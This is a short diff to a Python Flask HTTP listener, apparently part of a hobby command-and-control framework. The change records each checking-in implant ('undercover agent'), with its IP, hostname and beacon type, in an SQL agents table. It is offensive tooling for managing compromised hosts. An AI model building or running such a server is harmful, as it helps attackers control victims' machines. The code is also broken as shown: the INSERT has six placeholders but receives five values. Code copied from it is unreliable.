@@ -1,6 +1,8 @@
 import sys
+import os
 import threading
 
+# from core.stash import *
 from core.logger import *
 from random import choice
 from string import ascii_letters
@@ -8,10 +10,13 @@ from multiprocessing import Process
 from flask import Flask, render_template, request
 
 class HTTP_listener:
-    def __init__(self, name, ip, port):
+
+    def __init__(self, name, ip, port, stash):
         self.name = name
         self.ip = ip
         self.port = port
+
+        self.stash = stash
 
         ## to fix
         html_fold = '/home/blu/Documents/projectz/wtf_another_c2/core/html/'
@@ -29,7 +34,15 @@ class HTTP_listener:
             beacon_ip = request.remote_addr
             beacon_hostname = request.form.get("name")
             beacon_type = request.form.get("type")
+
             success(f'New undercover agent {beacon_name}.')
+            fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type,)
+            self.stash.sql_stash( """INSERT INTO agents(agent_name, \
+                                                        listener_name, \
+                                                        remote_ip, \
+                                                        hostname, \
+                                                        beacon_type, \
+                                                        enc_key ) VALUES( ?,?,?,?,?,? )""", fields )
             return (beacon_name, 200)
         
         @self.app.errorhandler(404)
